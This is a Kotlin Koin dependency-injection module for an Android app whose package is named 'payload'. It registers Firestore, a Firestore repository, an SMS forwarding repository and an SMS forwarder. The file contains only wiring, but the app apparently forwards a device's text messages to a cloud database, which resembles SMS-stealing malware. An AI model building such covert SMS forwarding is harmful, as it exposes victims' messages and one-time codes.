package com.payload.jansiix0ne.di

import com.google.firebase.firestore.FirebaseFirestore
import com.payload.jansiix0ne.data.repository.FirestoreRepository
import com.payload.jansiix0ne.data.repository.SmsForwardingRepository
import com.payload.jansiix0ne.util.SmsForwarder
import org.koin.android.ext.koin.androidContext
import org.koin.dsl.module

val appModule = module {
    // Firebase Firestore
    single { FirebaseFirestore.getInstance() }
    
    // Repositories
    single { FirestoreRepository(get()) }
    single { SmsForwardingRepository(androidContext()) }
    
    // Utilities
    single { SmsForwarder(androidContext(), get()) }
}
